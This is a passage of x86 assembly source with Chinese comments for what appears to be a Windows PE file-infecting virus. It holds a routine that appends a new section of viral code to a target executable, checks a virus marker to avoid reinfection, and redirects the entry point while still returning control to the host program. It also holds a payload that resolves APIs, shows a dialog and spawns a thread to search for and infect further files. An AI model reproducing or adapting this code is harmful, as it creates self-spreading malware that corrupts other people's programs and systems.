	LOCAL	iNewPointerToRawData			: DWORD	; ┛			文件偏移
	LOCAL	iNewSectionLength			: DWORD	; 新的 Section 节对齐后的长度
	LOCAL	pOptionalHeader				: DWORD ; 指向 Optional Header 的指针
	LOCAL	iOriginalAddressOfEntryPoint		: DWORD ; 原来的程序入口地址
	LOCAL	iOriginalImageBase			: DWORD ; 原来的基址

	cmp	iSectionLength, SIZE_OF_BUFFER_TO_WRITE
	ja	LABEL_ADD_SECTION_ERROR

	invoke	MyCreateFile, pszFileName,\
		GENERIC_READ or GENERIC_WRITE,\
		FILE_SHARE_READ,\
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,\
		NULL
	cmp	eax, INVALID_HANDLE_VALUE
	jz	LABEL_ADD_SECTION_END
	mov hFileToBeModified,eax	; 以写方式打开文件

	invoke	MySetFilePointer, hFileToBeModified, 0, NULL, FILE_BEGIN

	invoke	MyReadFile, hFileToBeModified, addr pBuf, 1024, addr iNumOfBytesRead, NULL

	lea	edi, pBuf				; edi 指向文件头
	assume	edi : ptr IMAGE_DOS_HEADER		; edi 强制类型转换成指向 IMAGE_DOS_HEADER 的指针
	cmp	[edi].e_magic, IMAGE_DOS_SIGNATURE	; 文件是否以 MZ 开始
	jnz	LABEL_ADD_SECTION_ERROR			; 文件不是以 MZ 开始，跳转到 失败

	add	edi, [edi].e_lfanew			; edi 指向 PE Header
	assume	edi : ptr IMAGE_NT_HEADERS		; edi 强制类型转换成指向 IMAGE_NT_HEADERS 的指针
	cmp	[edi].Signature, IMAGE_NT_SIGNATURE	; PE Header 是否以 'PE\0\0' 开始
	jnz	LABEL_ADD_SECTION_ERROR			; PE Header 不是以 'PE\0\0' 开始，跳转到 失败

	add	edi, 4					; 跳过'PE\0\0'，现在 edi 指向 File Header
	assume	edi : ptr IMAGE_FILE_HEADER		; edi 强制类型转换成指向 IMAGE_FILE_HEADER 的指针

	mov	ax, [edi].NumberOfSections
	mov	iNumberOfSectionsOrigin, ax		; 得到原来的节数

	lea	eax, [edi].NumberOfSections
	lea	edx, pBuf
	sub	eax, edx
	mov	iNumberOfSectionsPosition, eax

	add	edi, sizeof IMAGE_FILE_HEADER		; edi 指向 Optional Header
	mov	[pOptionalHeader], edi			; 保存一下, 以备后用
	assume	edi : ptr IMAGE_OPTIONAL_HEADER32	; edi 强制类型转换成指向 IMAGE_OPTIONAL_HEADER32 的指针
	
	mov	eax, [edi].SectionAlignment
	mov	iSectionAlignment, eax			; 节对齐粒度
	mov	eax, [edi].FileAlignment
	mov	iFileAlignment, eax			; 文件对齐粒度
	mov	eax, [edi].AddressOfEntryPoint		;
	mov	iOriginalAddressOfEntryPoint, eax	; 原来的程序入口地址
	mov	eax, [edi].ImageBase			;
	mov	iOriginalImageBase, eax			; 原来的基址

	add	edi, sizeof IMAGE_OPTIONAL_HEADER32	; edi 指向 Section Table
	;assume	edi : ptr IMAGE_SECTION_HEADER		; edi 强制类型转换成指向 IMAGE_SECTION_HEADER 的指针

	mov	ax, sizeof IMAGE_SECTION_HEADER		; 一个 Section header 有多长
	mul	iNumberOfSectionsOrigin			; 所有 Section header 有多长
	movzx	eax, ax					; eax <- ax
	add	edi, eax				; edi -> 新的 Section header
	mov	eax, edi				; eax -> 新的 Section header
	lea	edx, pBuf
	sub	eax, edx				; eax <- 新的 Section header 相对于文件头的偏移
	mov	iNewSectionHdrPosition, eax		; 保存起来以备后用

	sub	edi, sizeof IMAGE_SECTION_HEADER	; edi -> 最后一个 Section header
	assume	edi : ptr IMAGE_SECTION_HEADER		; edi 强制类型转换成指向 IMAGE_SECTION_HEADER 的指针

	mov	eax, [edi].Misc.PhysicalAddress		; 最后一个 Section header 中内容有多长
;	mov	iLastPhysicalAddress, eax		; 保存一下以备后用
	xor	edx, edx				; edx 清零, 为除运算作准备
	div	iSectionAlignment			; 除以节对齐粒度, 商放在 eax 中, 余数放在 edx 中
	cmp	edx, 0					; 如果余数为零
	jz	LABEL_REMAINDER_IS_ZERO			; 商不用加一
	inc	eax					; 余数不为零, 商加一
LABEL_REMAINDER_IS_ZERO:
	mul	iSectionAlignment			; 最后一个 Section 总共占的空间 <- (商 + 1) * 节对齐粒度
	mov	edx, [edi].VirtualAddress		; 最后一个 Section 的 RVA
	add	eax, edx				; eax <- 新的 Section 的 RVA
	mov	iNewVirtualAddress, eax			; iNewVirtualAddress <- 新的 Section 的 RVA

	mov	eax, iSectionLength			; 新的 Section header 中内容有多长
	xor	edx, edx				; edx 清零, 为除运算作准备
	div	iFileAlignment				; 除以文件对齐粒度, 商放在 eax 中, 余数放在 edx 中
	cmp	edx, 0					; 如果余数为零
	jz	LABEL_REMAINDER_IS_ZERO2		; 商不用加一
	inc	eax					; 余数不为零, 商加一
LABEL_REMAINDER_IS_ZERO2:
	mul	iFileAlignment				; 最后一个 Section 总共占的空间 <- (商 + 1) * 文件对齐粒度
	mov	iNewSizeOfRawData, eax			; iNewSizeOfRawData <- 新的 Section 的 SizeOfRawData
	
	mov	eax, iSectionLength			; 新的 Section header 中内容有多长
	xor	edx, edx				; edx 清零, 为除运算作准备
	div	iSectionAlignment			; 除以节对齐粒度, 商放在 eax 中, 余数放在 edx 中
	cmp	edx, 0					; 如果余数为零
	jz	LABEL_REMAINDER_IS_ZERO3		; 商不用加一
	inc	eax					; 余数不为零, 商加一
LABEL_REMAINDER_IS_ZERO3:
	mul	iSectionAlignment			; 最后一个 Section 总共占的空间 <- (商 + 1) * 节对齐粒度
	mov	[iNewSectionLength], eax		; 新的 Section 的长度

	mov	eax, [edi].PointerToRawData		; 最后一个 Section 在文件中的偏移
	mov	iLastPointerToRawData ,eax		; 保存一下以备后用
	cmp	eax, 0					; 这个偏移有时候居然是 0 !如果真是 0 我们就不得不退回一个节.
	jnz	LABEL_POINTERTORAWDATA_NONZERO		; 不是 0 , edi 仍指向倒数第一个 Section
	sub	edi, sizeof IMAGE_SECTION_HEADER	; edi 指向倒数第二个 Section
LABEL_POINTERTORAWDATA_NONZERO:
	mov	eax, [edi].PointerToRawData		; 倒数第一或第二个 Section 在文件中的偏移
	add	eax, [edi].SizeOfRawData		; 即使是倒数第二个的话，也不再判断了, 直接加上这个节经过文件对齐以后的长度
	mov	iNewPointerToRawData, eax		; iNewPointerToRawData <- 新的 Section 的 PointerToRawData

	; 判断是否已被传染 --------------------------------------------------------------
	invoke	MySetFilePointer, hFileToBeModified, iLastPointerToRawData, NULL, FILE_BEGIN	; 移动文件指针到最后一个节的开头处
	invoke	MySetFilePointer, hFileToBeModified, 5, NULL, FILE_CURRENT	; 移动文件指针到病毒标记处
	invoke	MyReadFile,	  hFileToBeModified, addr pBufViruName, 16, addr iNumOfBytesRead, NULL	; 读出 10H 个字节
	lea	eax, szViruName
	add	eax, ebx
	invoke	MyStrcmp, addr pBufViruName, eax	; 是不是已经传染了呢?
	cmp	eax, 0					; 如果是
	jz	LABEL_ADD_SECTION_END			; 跳到结尾
	; ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 判断是否已被传染

	invoke	MySetFilePointer, hFileToBeModified, iNewSectionHdrPosition, NULL, FILE_BEGIN	; 移动文件指针到新的 Section header 处

	invoke	MyRtlZeroMemory, addr pBufToWrite, SIZE_OF_BUFFER_TO_WRITE	; 将缓冲区清零
	lea	esi, pBufToWrite			; esi --> pBufToWrite 首地址
	assume	esi : ptr IMAGE_SECTION_HEADER		; esi 强制类型转换成指向 IMAGE_SECTION_HEADER 的指针

	;invoke	MyMemcpy, addr [esi].Name1, addr szNameOfNewSection, 8
	lea	eax, [esi].Name1
	mov	byte ptr [eax], '.'
	inc	eax
	mov	byte ptr [eax], 'd'
	inc	eax
	mov	byte ptr [eax], 'a'
	inc	eax
	mov	byte ptr [eax], 't'
	inc	eax
	mov	byte ptr [eax], 'a'
	inc	eax
	mov	byte ptr [eax], 'x'

	mov	eax, iSectionLength
	mov	[esi].Misc.PhysicalAddress, eax

	mov	eax, iNewVirtualAddress
	mov	[esi].VirtualAddress, eax

	mov	eax, iNewSizeOfRawData
	mov	[esi].SizeOfRawData, eax

	mov	eax, iNewPointerToRawData
	mov	[esi].PointerToRawData, eax

	mov	eax, 0E0000020H
	mov	[esi].Characteristics, eax

	invoke	MyWriteFile, hFileToBeModified, addr pBufToWrite, sizeof IMAGE_SECTION_HEADER, addr iNumOfBytesWritten, NULL	; 往文件中写

	invoke	MySetFilePointer, hFileToBeModified, iNumberOfSectionsPosition, NULL, FILE_BEGIN	; 移动文件指针到 NumberOfSections 处
	mov	dx, iNumberOfSectionsOrigin
	inc	dx				;  dx <-- 新的节数
	lea	esi, pBufToWrite		; esi --> pBufToWrite 首地址
	mov	word ptr [esi], dx		; pBufToWrite <-- 新的节数
	add	esi, 2
	mov	byte ptr [esi], 0		; pBufToWrite[2] <-- 0  空零结束
	invoke	MyWriteFile, hFileToBeModified, addr pBufToWrite, 2, addr iNumOfBytesWritten, NULL	; 往文件中写

	;invoke	MySetFilePointer, hFileToBeModified, 0, NULL, FILE_END		; 移动文件指针到文件尾
	invoke	MySetFilePointer, hFileToBeModified, iNewPointerToRawData, NULL, FILE_BEGIN	; 移动文件指针到文件尾
	invoke	MyRtlZeroMemory, addr pBufToWrite, SIZE_OF_BUFFER_TO_WRITE	; 缓冲区清零
	invoke	MyMemcpy, addr pBufToWrite, pSectionContent, iSectionLength	; 将要添加的内容拷贝到 pBufToWrite 中
	lea	esi, pBufToWrite			; ┓
	lea	eax, iCodeInsideLength			; ┃
	add	eax, ebx				; ┃
	mov	edx, dword ptr [eax]			; ┃
	add	esi, edx				; ┃
	sub	esi, 6					; ┣  新的代码执行完了后，要返回程序原来的入口
	mov	byte ptr [esi], 068h			; ┃068H, 0XXH, 0XXH, 0XXH, 0XXH	 = push XXXXXXXX
	inc	esi					; ┃
	mov	eax, [iOriginalAddressOfEntryPoint]	; ┃
	add	eax, [iOriginalImageBase]		; ┃
	mov	dword ptr [esi], eax			; ┛
	invoke	MyWriteFile, hFileToBeModified, addr pBufToWrite, iNewSizeOfRawData, addr iNumOfBytesWritten, NULL	; 往文件中写

	mov	edi, pOptionalHeader			; edi 指向 Optional Header
	assume	edi : ptr IMAGE_OPTIONAL_HEADER32	; edi 强制类型转换成指向 IMAGE_OPTIONAL_HEADER32 的指针
	lea	eax, [edi].SizeOfImage			; ┓ 
	lea	edx, pBuf				; ┣ SizeOfImage 相对于文件头的偏移 <- SizeOfImage 的地址 - 文件头的地址
	sub	eax, edx				; ┛
	invoke	MySetFilePointer, hFileToBeModified, eax, NULL, FILE_BEGIN	; 移动文件指针到 SizeOfImage 处
	invoke	MyRtlZeroMemory, addr pBufToWrite, SIZE_OF_BUFFER_TO_WRITE	; 将缓冲区清零
	lea	esi, pBufToWrite			; esi --> pBufToWrite 首地址
	mov	ecx, [edi].SizeOfImage			; 旧的 SizeOfImage
	add	ecx, iNewSectionLength			; 新的 SizeOfImage
	mov	dword ptr [esi], ecx
	invoke	MyWriteFile, hFileToBeModified, addr pBufToWrite, 4, addr iNumOfBytesWritten, NULL	; 往文件中写

	lea	eax, [edi].AddressOfEntryPoint		; ┓ 
	lea	edx, pBuf				; ┣ AddressOfEntryPoint 相对于文件头的偏移 <- AddressOfEntryPoint 的地址 - 文件头的地址
	sub	eax, edx				; ┛
	invoke	MySetFilePointer, hFileToBeModified, eax, NULL, FILE_BEGIN	; 移动文件指针到 AddressOfEntryPoint 处
	invoke	MyRtlZeroMemory, addr pBufToWrite, SIZE_OF_BUFFER_TO_WRITE	; 将缓冲区清零
	lea	esi, pBufToWrite			; esi --> pBufToWrite 首地址
	add	ecx, iNewVirtualAddress			; 新的 AddressOfEntryPoint
	mov	dword ptr [esi], ecx
	invoke	MyWriteFile, hFileToBeModified, addr pBufToWrite, 4, addr iNumOfBytesWritten, NULL	; 往文件中写
	
	assume	edi : nothing

	mov	eax, 0			; 添加成功就返回 0
	jmp	LABEL_ADD_SECTION_END


LABEL_ADD_SECTION_ERROR:
	mov	eax, 0ffffffffh	; 添加失败就返回 ffffffffh

LABEL_ADD_SECTION_END:
	invoke	MyCloseHandle, hFileToBeModified
	ret
AddASectionToFile ENDP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; 增加一个 Section（结束）
;==================================================

;==================================================
; 弹出一个对话框的过程
;--------------------------------------------------
__start:
	call	GetAppBase

	lea	eax, szLoadLibraryA
	add	eax, ebx
	push	eax
	push	BASE_OF_KERNEL32
	lea	eax, szKernel32Name
	add	eax, ebx
	push	eax
	call	GetApiAddress			; 取得 LoadLibraryA 的入口地址
	mov	[ebx + pfLoadLibraryA], eax	; 存起来

	lea	eax, szGetProcAddress
	add	eax, ebx
	push	eax
	push	BASE_OF_KERNEL32
	lea	eax, szKernel32Name
	add	eax, ebx
	push	eax
	call	GetApiAddress			; 取得 GetProcAddress 的入口地址
	mov	[ebx + pfGetProcAddress], eax	; 存起来

	lea	eax, szUser32Name
	add	eax, ebx
	push	eax
	call	dword ptr [ebx + pfLoadLibraryA]	; 获得 User32.dll 的句柄
	mov	dword ptr [ebx + pUser32Base], eax

; 如何取得一个函数的地址 ----------------------------------------------------------------
;	lea	edx, sz____________________
;	add	edx, ebx
;	push	edx
;	push	BASE_OF_KERNEL32
;	mov	eax, dword ptr [ebx + pfGetProcAddress]
;	call	eax	; 取得 ____________________ 的入口地址
;	mov	dword ptr [ebx + pf____________________], eax
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

; 得到Api们的入口地址 ----------------------------------------------------------------
	lea	esi, [ebx + offset pApiNames]
	lea	edi, [ebx + offset pfFindFirstFileA]

LABEL_GET_PROCADDR_LOOP:
	lodsd
	cmp	eax, 0
	jz	LABEL_GET_PROCADDR_LOOP_END
	add	eax, ebx
	push	eax
	push	BASE_OF_KERNEL32
	mov	eax, dword ptr [ebx + pfGetProcAddress]
	call	eax
	stosd
	jmp	LABEL_GET_PROCADDR_LOOP
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 得到Api们的入口地址

LABEL_GET_PROCADDR_LOOP_END:

	lea	edx, szMessageBoxA
	add	edx, ebx
	push	edx
	mov	eax, dword ptr [ebx + pUser32Base]
	push	eax
	mov	eax, dword ptr [ebx + pfGetProcAddress]
	call	eax
	mov	dword ptr [ebx + pfMessageBoxA], eax		; 取得 MessageBoxA 的入口地址
	
	push    40h+1000h	; style
	lea	edx, szTitle	; title
	add	edx, ebx
	push	edx
	lea	edx, szMsg	; 消息内容
	add	edx, ebx
	push	edx
	push    0
	mov	eax, dword ptr [ebx + pfMessageBoxA]
	call    eax						; 产生一个对话框

;	lea	eax, szBeginPathForTest
;	add	eax, ebx
;	push	eax
;	call	SearchAndInfect

	push	NULL
	push	CREATE_SUSPENDED
	lea	eax, szBeginPathForTest
	add	eax, ebx
	push	eax
	lea	eax, ThreadSearchAndInfectPosition
	add	eax, 4
	add	eax, ebx
	push	eax		; = push SearchAndInfect
	push	NULL
	push	NULL
	mov	eax, dword ptr [ebx + pfCreateThread]
	call    eax
	
	push	eax
	mov	eax, dword ptr [ebx + pfResumeThread]
	call    eax

	nop		; ┓
	nop		; ┃
	nop		; ┣ 必不可少! 将来会被替换成 PUSH XXXXXXXX , 以便返回时返回到宿主原来的入口
	nop		; ┃
	nop		; ┛

	ret
;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
; 弹出一个对话框的过程（结束）
;==================================================

;^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
;----------------------------------------------------------------------------------------------------
; 以上代码是要写入宿主程序的部分
;====================================================================================================
; ->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->=>->
;****************************************************************************************************

iCodeInsideLength	DWORD	$-LABEL_CODE_INSIDE	; 要写入宿主程序的部分的长度 = iCodeInsideLength + 4

end start